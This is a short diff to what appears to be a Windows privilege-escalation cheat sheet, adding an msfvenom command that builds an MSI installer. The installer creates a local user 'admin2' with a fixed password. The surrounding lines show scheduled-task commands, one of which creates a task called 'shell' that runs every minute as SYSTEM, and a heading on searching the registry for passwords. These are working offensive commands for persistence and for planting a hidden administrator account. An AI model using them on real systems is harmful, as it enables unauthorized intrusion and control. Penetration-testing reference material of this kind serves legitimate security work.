@@ -77,6 +77,10 @@ schtasks /query /fo LIST /v | Select-String -Pattern "c:\\user" -Context 5,5
 ```powershell
 schtasks /create /tn "shell" /tr "task.exe" /sc MINUTE /mo 1 /ru "NT AUTHORITY\SYSTEM"
 ```
+
+```bash
+msfvenom -p windows/adduser USER=admin2 PASS=P@ssword123! -f msi-nouac -o alwe.msi
+```
 Search for passwords inside the registry
 ---
 ```powershell
